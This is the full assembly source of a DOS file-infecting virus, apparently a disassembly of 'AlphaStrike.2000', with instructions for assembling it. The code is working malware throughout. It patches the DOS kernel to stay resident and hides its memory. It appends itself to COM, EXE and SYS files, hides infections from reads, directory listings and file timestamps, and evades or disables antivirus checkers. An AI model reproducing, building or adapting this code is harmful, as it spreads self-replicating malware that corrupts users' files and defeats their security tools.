; AlphaStrike.2000 or whatever its called by Neurobasher. disasm by retch.
; there are no comments. there are no need for comments unless you are lame.
;
; GREETZ R LAYME SO I WEEL NOT DO NE.
;
; 2 COMPYLE:
;       tasm /m alpha.asm   (EYE UZED FORE DOT SOMETHING)
;       tlink alpha.obj     (umm... 2.xx)
;       exe2bin alpha.exe alpha.com
;
; i am contactable via retro@pcscav.com

.model  tiny
.code
.286

virus_start:    mov     di, 0F242h
                mov     si, word ptr ds:[2h]
		sub	si, di
		cmp	si, 1000h
		call	getip
getip:          mov     bp, sp
                mov     bp, [bp]
		cld	
		mov	ax, 4458h
		int	21h
		jb	checkifdosinhma
		mov	ds, es:[bx+0Eh]
		mov	si, 0Bh
		jmp	addressatSI
sysentry:       pushf   
		pusha	
		push	ds
		push	es
		jmp	virus_start
checkifdosinhma:mov     ax, 3306h
		int	21h
		cmp	al, 6
		jnz	checkdosversion
		cmp	dh, 10h
		jnz	go_abortinstall
		mov	ax, 0FFC4h
		jmp	compareints
checkdosversion:mov     ah, 30h
		int	21h
		xchg	al, ah
		cmp	ax, 31Eh
		mov	ax, 1Bh
		jb	go_abortinstall
compareints:    mov     cx, 0Ah
		mov	ds, cx
		mov	es, cx
		mov	si, 14h
		mov	bx, si
		lea	di, [bx+si]
		cmpsw
		jnz	abortinstall
		cmpsw
go_abortinstall:jnz     abortinstall
		lds	si, [bx]
		add	si, ax
		cmp	al, 1Bh
		jz	checkifkernelpatched
		mov	si, [si+8]
addressatSI:    lds     si, [si]
checkifkernelpatched:
                cmp     byte ptr [si], 0EAh
		jz	abortinstall
                mov     cs:[bp+(kernaladdress  )-getip], si
                mov     cs:[bp+(kernaladdress+2)-getip], ds
		call	getmemory
		jnz	abortinstall
                lea     si, [bp+(virus_start)-getip]
		push	cs
		pop	ds
		mov	es, cx
		mov	cx, offset header
		rep movsb
		sub	ax, ax
                mov     cl, 0C0h
		rep stosb
                mov     di, offset newint21
                mov     es:[di+1], al
                lds     si, ds:[bp+(kernaladdress)-getip]
		mov	ax, [si]
                mov     cl, 6Ch
		mov	bx, 6
                cmp     al, 0FAh
		jz	patchkernel
		mov	bl, 7
                cmp     al, 2Eh
		jz	patchkernel
                mov     cl, 69h
		mov	bl, 5
                cmp     al, 80h
		jnz	abortinstall
patchkernel:    mov     es:[di+savecmp-newint21], cl
		add	bx, si
                mov     es:[di+kernaladdress-newint21], bx
                mov     byte ptr [si], 0EAh
		mov	[si+1],	di
		mov	[si+3],	es
abortinstall:   pop     ax
		sub	si, si
		mov	ax, ss
                cmp     ah, 90h
		jz	restoresys
                mov     ah, 62h
		int	21h
		push	bx
		mov	ds, bx
		mov	cx, [si+2Ch]
		jcxz	restorehost
		mov	ds, cx
		mov	ch, 8
findcomspec:    cmp     word ptr [si], 4F43h
		jnz	keeplooking
		cmp	word ptr [si+6], 3D43h
		jz	foundcomspec
keeplooking:    inc     si
		loop	findcomspec
		jmp	restorehost
foundcomspec:   mov     ax, 3D00h
		lea	dx, [si+8]
		int	21h
		xchg	ax, bx
                mov     ah, 3Eh
		int	21h
restorehost:    pop     ax
		mov	ds, ax
		mov	es, ax
		add	ax, 10h
		mov	bx, ax
                db      81h,0C3h
savess          dw      0FFF0h
		cli	
                db      0BCh
savesp          dw      0FFFEh
		mov	ss, bx
                db      5
savecs          dw      0FFF0h
                mov     cs:[bp+jumpsegment-getip], ax
		cmp	sp, 0FFFEh
		jnz	zeroregs
                mov     word ptr ds:100h, 20CDh
first2          =       $-2
                mov     byte ptr ds:102h, 90h
next1           =       $-1
zeroregs:       sub     ax, ax
		sub	bx, bx
		sub	cx, cx
		cwd	
		sub	si, si
		sub	di, di
		sub	bp, bp
		sti	
		jmp	near ptr jumptohost
                db      0EAh
jumptohost      db      0EAh
saveip          dw      100h
jumpsegment     dw      0
restoresys:     pop     es
		pop	ds
		mov	word ptr [si+8], 0
sysret2         =       $-2
		popa
		popf	
                db      68h
sysret          dw      0
		ret	
getmemory:      call    getlastmcb
		mov	ax, ds
		mov	bx, [si+3]
		sub	bx, dx
		add	ax, bx
		xchg	ax, cx
		xchg	ax, bx
		jmp	setnewmcbsize
setlastmcbsize: call    getlastmcb
		dec	ax		; ax=cs
		mov	cx, ax		; cx=ax
sublastmcbseg:  sub     ax, bx          ; ax=ax-lastmcbseg
setnewmcbsize:  dec     ax
		or	di, di
		jnz	dontsetmcbsize
		mov	[si+3],	ax
dontsetmcbsize: ret     
modifytomseginpsp:
                mov     ah, 62h
		int	21h
		mov	ds, bx
		int	12h
		shl	ax, 6
                sub     ax, 87h
		mov	ds:2, ax
hideourmem:     call    getlastmcb
		add	ax, dx		; ax=virusparasize+virusseg+1
		jmp	sublastmcbseg
getlastmcb:     push    es
                mov     ah, 52h
		int	21h
		mov	ds, es:[bx-2]
		mov	ax, 5802h
		int	21h
		cbw	
		push	ax
		mov	ax, 5803h
		mov	bx, 1
                int     21h             ; set umb's as part of chain
		sub	si, si
		mov	di, si
getlastmcbloop: call    getnextmcb
		jnz	getlastmcbloop
		pop	bx
		push	ax
		mov	ax, 5803h
		int	21h
		pop	bx
		pop	es
		mov	ax, cs
		inc	ax
                mov     dx, 87h         ; 2160d / 10h
		ret	
getnextmcb:     cmp     word ptr [si+10h], 20CDh
		jnz	checkiflast
                cmp     byte ptr [si+15h], 0EAh
		jnz	checkiflast
		inc	di
checkiflast:    cmp     byte ptr [si], 5Ah      ; 'Z'
		jz	islastblock
		mov	ax, ds
		inc	ax
		add	ax, [si+3]
		mov	ds, ax
islastblock:    ret 
newint21:       db 0EBh
virusactive	db 4Ch
		mov	cs:saveds, ds
		push	cs
		pop	ds
		mov	savedi,	di
                mov     di, offset saveds
                mov     byte ptr [di+virusactive-saveds], 4Ch
                mov     [di+savees-saveds], es
                mov     [di+saveax-saveds], ax
                mov     [di+savebx-saveds], bx
                mov     [di+savecx-saveds], cx
                mov     [di+savedx-saveds], dx
                mov     [di+savesi-saveds], si
                mov     [di+savebp-saveds], bp
		push	cs
		pop	es
		mov	di, offset functions
		db 0B9h
stealthmode	dw 14h
		xchg	al, ah
		xor	al, 5Fh
		cld	
		repne scasb
		jnz	exithandler
                sub     di, offset functions+1
		shl	di, 1
		add	di, offset functionoffsets
		push	offset exithandler
		push	word ptr [di]
		jmp	near ptr restoreregs
exithandler:    call    restoreregsandsetvirusactive
emulateoldkernal:
                cmp     ah, 6Ch
savecmp         =       $-1
		ja	zeroal_iret
		cli	
		db 0EAh
kernaladdress	dd 0FDC840FEh
writeheader:    mov     ah, 40h
		mov	cx, 18h
readwritefromsi:mov     dx, si
int21:          cli     
		pushf	
		call	cs:kernaladdress
		ret	
zeroal_iret:    mov     al, 0
		iret	
restoreregsandsetvirusactive:
		call	near ptr restoreregs
setvirusactive: mov     cs:virusactive, 0
		ret	
memstealth:     call    setlastmcbsize  ; 48h/49h/4Ah
restoreregs:    db      0B8h
saveds          dw      9850h
		mov	ds, ax
                db      0B8h
savees          dw      6D8h
		mov	es, ax
                db      0B8h
saveax          dw      4B00h
                db      0BBh
savebx          dw      241h
                db      0B9h 
savecx          dw      209h
                db      0BAh
savedx          dw      40E6h
                db      0BEh
savesi          dw      0E4h 
                db      0BFh
savedi          dw      0
                db      0BDh
savebp          dw      6914h
		ret	
loc_0_272:      mov     dx, 3F5h
		mov	al, 4
		mov	ch, 4
		out	dx, al
                loop    $
		mov	ch, 4
		out	dx, al
                loop    $
		in	al, dx
		test	al, 40h
		ret	
message         db      002h,0E0h,052h,0BFh,0B4h,0B0h,0B8h,0BFh,0E0h,0ADh 
                db      0ACh,0AEh,0B7h,0B5h,0BBh,051h,0E0h,007h,0E0h,0BFh 
                db      09Ch,08Ah,09Fh,092h,09Dh,09Bh,09Ch,0E0h,0ACh,09Fh 
                db      09Dh,08Ch,097h,09Dh,09Fh,094h,0E0h,0AAh,097h,08Eh 
                db      09Fh,094h,0E0h,0B7h,093h,090h,094h,09Fh,092h,08Ch
                db      0E0h,09Eh,087h,0E0h,0B2h,0BBh,0ABh,0AEh,0B1h,0BEh 
                db      0BFh,0ADh,0B8h,0BBh,0AEh,0D9h,0C7h,0CDh,0E0h,0D1h 
                db      0E0h,0B9h,09Bh,08Eh,093h,09Fh,092h,087h,0E0h,002h 
setnofilestealth:
		mov	byte ptr cs:stealthmode, 12h
activate:       ret 
		call	clearscreen
		mov	ah, 2
		mov	bh, 0
		mov	dx, 0C00h
		int	10h
		mov	si, offset message
                mov     cx, 4Eh
displayloop:    lods    byte ptr cs:[si]
		neg	al
		int	29h
		loop	displayloop
		xor	ax, ax
		int	16h
clearscreen:    mov     ax, 3
		int	10h
setnoactivate:  mov     byte ptr cs:activate, 0C3h
		ret	
execute:        call    setfullstealth
		call	setnoactivate
		cmp	al, 1
                mov     al, 90h
		call	setdirstealth
		jnz	infectdx
		mov	ax, 3D02h
		int	21h
		jb	ret3
		xchg	ax, bx
		call	disinfecthandle
                mov     ah, 3Eh
		int	21h
                mov     byte ptr ds:activate, 90h
ret3:  		ret	
infectsi:       mov     dx, si
infectdx:       cmp     ax, 4300h
		jz	ret3
		call	sethandletozero
                cmp     ah, 3Dh
		jnz	dontsetfullstealth
		call	setfullstealth
dontsetfullstealth:
		mov	si, dx
		mov	di, offset buffer
		push	cs
		pop	es
copyname:       lodsb
		or	al, al
		jz	namecopied
		stosb
		jmp	copyname
namecopied:     stosb
		mov	cl, byte ptr cs:saveax+1
		mov	ax, [si-7]
		mov	bx, [si-0Bh]
                cmp     cl, 3Dh
		jnz	notopen
		db 0EBh
dontopenchklist	db 16h
		cmp	ax, 5453h	; chkliST?
		jnz	notopen
		cmp	bx, 4B48h	; cHKlist?
		jnz	notopen
		pop	ax
		call	restoreregsandsetvirusactive
		mov	ax, 2
		stc	
		retf	2
notopen:        cmp     cl, 4Bh
		jnz	checkifavactive
		mov	cl, 16h
		cmp	ax, 5641h
		jnz	notmsavorcpav
		mov	cl, 0
notmsavorcpav:  mov     cs:dontopenchklist, cl
		cmp	bx, 5343h
		jz	setmemstealthonly
		cmp	bx, 4142h
		jz	setmemstealthonly
		cmp	ax, 4148h
		jz	setmemstealthonly
		cmp	ax, 4A52h
		jz	setmemstealthonly
		cmp	word ptr [si-8], 495Ah
		jnz	leavestealthmode
setmemstealthonly:
		mov	byte ptr cs:stealthmode, 8
leavestealthmode:
		push	ax
		mov	ax, 160Ah
		int	2Fh
		cmp	al, 0Ah
		pop	ax
		jnz	checkifavactive
		cmp	ax, 5641h
		jz	checkifavactive
		cmp	bx, 544Eh
		jz	checkifavactive
		call	hideourmem
checkifavactive:
		mov	bx, 0FF0Fh
		xchg	ax, bx
		int	21h
		cmp	al, 1
		jz	ret4
		mov	bl, 0
		call	vsafe
		push	cs
		pop	ds
                mov     ah, 2Fh
		int	21h
		push	es
		push	bx
		mov	ah, 1Ah
		mov	dx, offset tempdta
		int	21h
		mov	ax, 3524h
		int	21h
		push	es
		push	bx
                mov     ah, 25h
		mov	dx, offset zeroal_iret
		int	21h
                mov     ah, 4Eh
                mov     cl, 27h
		call	setdxtobuffer_int21
		jb	restoreint24anddta
		mov	si, offset header
		sub	di, di
		mov	al, [si+18h]
		mov	attribs, al
		cmp	byte ptr [si], 2
		ja	notdriveAorB
		call	loc_0_272
		jz	checkfiletype
restoreint24anddta:
		mov	ax, 2524h
		pop	dx
		pop	ds
		int	21h
		mov	ah, 1Ah
		pop	dx
		pop	ds
		int	21h
togglevsafe	db 0B3h
vsafestatus	db 16h
vsafe:		mov	ax, 0FA02h
		mov	dx, 5945h
		int	16h
		mov	cs:vsafestatus,	cl
ret4: 		ret	
notdriveAorB:   cmp     [si+12h], di
		jnz	checkfiletype
		cmp	word ptr [si+10h], 2
		jb	restoreint24anddta
		cmp	byte ptr [si], 3
		jb	checkfiletype
                mov     ah, 2Ah
		int	21h
		sub	cx, 7BCh
		mov	ax, [si+1Bh]
		shr	ax, 1
		cmp	ah, cl
		jnz	checkfiletype
		shr	ax, 4
		and	al, 0Fh
		cmp	al, dh
		jz	restoreint24anddta
checkfiletype:  mov     bp, offset setcarry_ret
                cmp     word ptr [si+21h], 4254h        ; TB*
		jz	restoreint24anddta
                cmp     word ptr [si+0Ch], 4F43h        ; CO
		jnz	notcominfection
		mov	bp, offset infectcom
notcominfection:cmp     word ptr [si+1Eh], 0Bh
		jb	restoreint24anddta
                cmp     byte ptr [si+1Ch], 0C8h
		jnb	restoreint24anddta
		mov	al, [si+18h]
		and	al, 7
		jz	attributesok
		sub	cx, cx
		call	setattribs
		jb	restoreint24anddta
attributesok:   mov     ax, 3D02h
		call	setdxtobuffer_int21
		jb	near ptr restoreattribs
		xchg	ax, bx
                mov     ah, 3Fh
		mov	cx, 19h
		call	readwritefromsi
		mov	ax, [si]
		xchg	al, ah
		cmp	ax, 4D5Ah
		jnz	notexeinfection
		mov	bp, offset infectexe
		jmp	notsysinfection
notexeinfection:cmp     ax, 0FFFFh
		jnz	notsysinfection
		mov	bp, offset infectsys
notsysinfection:call    bp
		jb	dontwriteheader
		call	writeheader
dontwriteheader:mov     ax, 5700h
		mov	cx, [si+19h]
		mov	dx, [si+1Bh]
		inc	ax
                int     21h
                mov     ah, 3Eh
		int	21h
restoreattribs	db 0B1h
attribs		db 20h
		call	setattribs
		jmp	restoreint24anddta
setattribs:     mov     ax, 4301h
setdxtobuffer_int21:
		mov	ch, 0
		mov	dx, offset buffer
		jmp	int21
infectexe:      cmp     byte ptr [si+18h], 40h  ;WINDOZE EXE ?
		jz	setcarry_ret
		mov	ax, [si+4]
		dec	ax
		mov	cx, 200h
		mul	cx
		add	ax, [si+2]
		adc	dx, di
		cmp	[si+1Dh], ax
		jnz	setcarry_ret
		cmp	[si+1Fh], dx
		jz	nointernaloverlays
setcarry_ret:   stc 
		ret	
nointernaloverlays:
		mov	ax, [si+0Eh]
                mov     ds:savess, ax
		mov	ax, [si+10h]
                mov     ds:savesp, ax
		mov	ax, [si+16h]
                mov     ds:savecs, ax
		mov	ax, [si+14h]
                mov     ds:saveip, ax
		call	appendvirus
		jb	exitinfectexe
		mov	ax, [si+8]
		mov	cl, 10h
		mul	cx
		neg	ax
		not	dx
		add	ax, [si+1Dh]
		adc	dx, di
		add	dx, [si+1Fh]
		div	cx
		mov	[si+16h], ax
		mov	[si+14h], dx
		dec	ax
		mov	[si+0Eh], ax
		mov	word ptr [si+10h], 9D2h
                add     word ptr [si+0Ah], 0ADh
		mov	ax, [si+1Dh]
		mov	dx, [si+1Fh]
                add     ax, virussize
		adc	dx, di
		mov	cx, 200h
		div	cx
		inc	ax
		mov	[si+4],	ax
		mov	[si+2],	dx
		clc	
exitinfectexe:  ret 
infectcom:      cmp     word ptr [si+1Eh], 0D6h
		ja	exitcominfect
		mov	ax, [si]
                mov     word ptr ds:first2, ax
		mov	al, [si+2]
                mov     byte ptr ds:next1, al
		mov	ax, 0FFF0h
                mov     ds:savecs, ax
                mov     ds:savess, ax
                mov     word ptr ds:saveip, 100h
                mov     word ptr ds:savesp, 0FFFEh
		call	appendvirus
		jb	exitcominfect
                mov     byte ptr [si], 0E9h
                mov     ax, -3 ;0FFFDh
		add	ax, [si+1Dh]
		mov	[si+1],	ax
		clc	
exitcominfect:  ret 
infectsys:      mov     ax, [si+8]
                mov     word ptr ds:sysret, ax
                mov     word ptr ds:sysret2, ax
		call	appendvirus
		jb	ret5
		mov	ax, [si+1Dh]
                add     ax, offset sysentry
		mov	[si+8],	ax
		clc	
ret5: 		ret	
appendvirus:    mov     al, 2
		call	lseek
                mov     ah, 40h
                mov     cx, virussize
		cwd	
		call	int21
		cmp	ax, cx
		stc	
		jnz	ret1
                add     byte ptr [si+1Ch], 0C8h
lseekstart:     mov     al, 0
lseek:          mov     ah, 42h
		cwd	
                mov     cx, dx
doint21:        int     21h
ret1:           ret 
lseekbeforeend: mov     ax, 4202h
		mov	cx, 0FFFFh
		jmp	doint21
checkhandle:    cmp     bl, 5                   ;LAME HANDLE CHEQ.
		jb	exittimestealth
checkinfection: mov     ax, 5700h
		int	21h
		jb	exittimestealth
                cmp     dh, 0C8h
exittimestealth:ret 
blocklseek:     cmp     al, 2
		jnz	ret1
		call	checkinfection
		jb	ret1
		pop	ax
		call	near ptr restoreregs
		push	cx
                sub     dx, virussize
		sbb	cx, 0
		int	21h
		pop	cx
		jmp	setvirusactive_exit
setnodirstealth:mov     al, 0C3h
setdirstealth:  mov     byte ptr cs:fcbdirstealth, al
		ret	
fcbdirstealth:  nop 
		inc	sp
		inc	sp
		int	21h
		cmp	al, 0FFh
		jz	setvirusactive_exit
		pushf	
		push	ax
		call	getdta
		cmp	byte ptr [bx], 0FFh
		jnz	notextended
		add	bx, 7
notextended:    cmp     [bx+1Ah], al
		jb	exitdirstealth
		sub	[bx+1Ah], al
		add	bx, 3
		jmp	stealthdirsize
getdta:         mov     ah, 2Fh
		int	21h
                mov     al, 0C8h
		push	es
		pop	ds
		ret	
asciidirstealth:inc     sp
		inc	sp
		int	21h
		jb	setvirusactive_exit
		pushf	
		push	ax
		call	getdta
		cmp	[bx+19h], al
		jb	exitdirstealth
		sub	[bx+19h], al
stealthdirsize: cmp     word ptr [bx+1Bh], 0Bh
		jb	exitdirstealth
                sub     word ptr [bx+1Ah], virussize
		sbb	word ptr [bx+1Ch], 0
exitdirstealth: call    restoreregs
		pop	ax
		popf	
setvirusactive_exit:
		call	setvirusactive
		jmp	exitkeepflags
readoldheader:  mov     al, 1
		call	lseek
		push	cs
		pop	ds
		mov	oldposlo, ax
		mov	oldposhi, dx
		mov	si, offset header
                cmp     handle, bl
		jz	ret0
		mov	dx, 0FFDFh
		call	lseekbeforeend
                mov     ah, 3Fh
                mov     cx, 21h
		call	readwritefromsi
                mov     handle, bl
lseektooldpos:  mov     ax, 4200h
		db 0B9h
oldposhi	dw 0
		db 0BAh
oldposlo	dw 0
		int	21h
ret0:           ret 
disinfecthandle:call    checkhandle
		jb	ret0
		push	cx
		push	dx
		call	readoldheader
		call	lseekstart
		call	writeheader
                mov     dx, 0F830h      ; -virussize
		call	lseekbeforeend
                mov     ah, 40h
		sub	cx, cx
		int	21h
		pop	dx
		pop	cx
                sub     dh, 0C8h
		mov	ax, 5701h
		int	21h
		jmp	lseektooldpos
stealthread:    mov     bp, cx
		call	checkhandle
		jb	ret0
		pop	ax
		call	readoldheader
		sub	ax, [si+1Dh]
		sbb	dx, 0
		sub	dx, [si+1Fh]
		js	adjustread
		call	restoreregsandsetvirusactive
		sub	ax, ax
		clc	
exitkeepflags:  retf    2
adjustread:     add     ax, bp
		adc	dx, 0
		jnz	bigread
		sub	bp, ax
bigread:        push    bp
		call	near ptr restoreregs
		pop	cx
		int	21h
		pushf	
		push	ax
		jb	exitstealthread
		push	ds
		pop	es
		mov	di, dx
		push	cs
		pop	ds
		mov	si, offset header
		cmp	oldposhi, 0
		jnz	exitstealthread
		mov	ax, oldposlo
		cmp	ax, 18h
		jnb	exitstealthread
		add	si, ax
		add	cx, ax
		cmp	cx, 18h
		jbe	moveit
		sub	ax, 18h
		neg	ax
		xchg	ax, cx
moveit:         cld 
		rep movsb
exitstealthread:call    restoreregsandsetvirusactive
		pop	ax
popf_exitwithflags:
		popf	
		jmp	exitkeepflags
gettimestealth: cmp     byte ptr cs:stealthmode, 12h
		jnz	dotimestealth
		cmp	al, 0
		jz	ret2
setfullstealth: mov     byte ptr cs:stealthmode, 14h
		ret	
dotimestealth:  cmp     al, 0
		jnz	settimestealth
		inc	sp
		inc	sp
		int	21h
		pushf	
		jb	setvirusactive_exit1
		call	removemarkerfromdh
setvirusactive_exit1:
		call	setvirusactive
		jmp	popf_exitwithflags
settimestealth: call    setfullstealth
		mov	ax, 5700h
		int	21h
		jb	ret2
		pop	ax
                cmp     dh, 0C8h
		call	near ptr restoreregs
		jb	removemarkeranddoint21
                cmp     dh, 0C8h
		jnb	doint21andexit
                add     dh, 0C8h
doint21andexit: int     21h
		pushf	
		jmp	setvirusactive_exit1
removemarkeranddoint21:
		call	removemarkerfromdh
		jmp	doint21andexit
removemarkerfromdh:
                cmp     dh, 0C8h
		jb	notmarked
                sub     dh, 0C8h
notmarked:      ret 
sethandletozero:mov     cs:handle, 0
ret2:           ret 
; NOTE : ALL FUNKTIONZ ARE XORED WITH 5Fh
functions       db      013h            ; 4Ch - prog terminate
                db      017h            ; 48h - create mem block
                db      016h            ; 49h - release memory
                db      015h            ; 4Ah - resize mem block
                db      00Dh            ; 52h - get SYSVARS
                db      0B5h            ; 0EAh - ALLOC HUGE SEG
                db      06Dh            ; 32h - GET DPB
                db      014h            ; 4Bh - program EXEC
                db      062h            ; 3Dh - open file
                db      04Eh            ; 11h - fcb FindFirst
                db      04Dh            ; 12h - fcb FindNext
                db      011h            ; 4Eh - ASCII FindFirst
                db      010h            ; 4Fh - ASCII FindNext
                db      008h            ; 57h - get/set file time
                db      033h            ; 6Ch - extended open
                db      01Ch            ; 43h - get/set attribs
                db      061h            ; 3Eh - handle close
                db      01Fh            ; 40h - handle write
                db      01Dh            ; 42h - lseek
                db      060h            ; 3Fh - handle read
functionoffsets dw      offset setnofilestealth
                dw      offset memstealth
                dw      offset memstealth
                dw      offset memstealth
                dw      offset hideourmem
                dw      offset modifytomseginpsp
                dw      offset setnodirstealth
                dw      offset execute
                dw      offset infectdx
                dw      offset fcbdirstealth
                dw      offset fcbdirstealth
                dw      offset asciidirstealth
                dw      offset asciidirstealth
                dw      offset gettimestealth
                dw      offset infectsi
                dw      offset infectdx
                dw      offset sethandletozero
                dw      offset disinfecthandle
                dw      offset blocklseek
                dw      offset stealthread

header          db      0CDh,020h,090h
tempdta         db      3Ch dup (0)
buffer          db      80h dup (0)
handle          db      0
virussize       =       7D0h
		end    virus_start
